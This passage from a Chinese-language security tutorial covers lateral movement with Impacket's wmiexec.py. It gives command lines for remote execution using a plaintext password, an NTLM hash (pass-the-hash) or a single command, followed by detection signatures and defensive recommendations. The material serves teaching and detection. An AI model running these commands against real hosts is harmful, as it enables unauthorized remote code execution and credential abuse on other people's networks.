    - 回读结果：工具通过 SMB 读取该文件，将结果回显，随后删除文件。

  - 整个过程没有创建服务，也没有留下 PSEXESVC.exe 这类服务程序。

- **实操：从密码到哈希**
  wmiexec.py 支持多种凭据形式。

  - 使用明文密码

    ```bash
    wmiexec.py domain.local/admin:'Password123'@10.10.10.50
    ```

  - 使用 NTLM 哈希（Pass-the-Hash）

    ```bash
    wmiexec.py -hashes :a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 domain.local/admin@10.10.10.50
    ```

  - 执行单条命令

    ```bash
    wmiexec.py domain.local/admin:'Password123'@10.10.10.50 "ipconfig /all"
    ```
    执行成功后，会获得一个半交互式 Shell。前提是使用的账户（或哈希对应的账户）必须是目标主机的本地管理员，因为远程调用 Win32_Process.Create 需要相应权限。

- **检测与防御**
  WMI 流量本身是合法的管理流量，检测难度中等，但并非无迹可寻。

  - 关键检测信号：wmiexec.py 的命令行有一个非常固定的模式，它执行的命令会被包装成类似  `cmd.exe /Q /c <你的命令> 1> \\127.0.0.1\ADMIN$\__<时间戳> 2>&1 `的形式。这个重定向到 ADMIN$ 共享的临时文件路径（文件名以双下划线开头）是它最核心的行为指纹。

  - 此外，以下行为也值得关注：

    - 进程血缘异常：WmiPrvSE.exe 启动 cmd.exe 或 powershell.exe。正常情况下，WmiPrvSE.exe 的子进程应相对固定，大量或异常的 spawn 行为可作为狩猎线索。

    - 网络登录关联：将进程创建事件（如 Event ID 4688）与网络登录事件（Event ID 4624，Logon Type 3）通过 Logon ID 关联，可以定位远程 WMI 调用来源。

- **防御建议**

  - 启用命令行审计：确保开启 Event ID 4688 并记录命令行参数。

  - 限制本地管理员权限：WMI 利用的前提就是拥有管理员级凭据。严格控制本地管理员组成员，使用 LAPS 管理本地密码，可以显著缩小攻击面。

  - 网络层限制：在不需要跨主机 WMI 通信的环境中，通过防火墙或分段策略限制 WMI/DCOM（端口 135 及动态高端口）的横向流动。
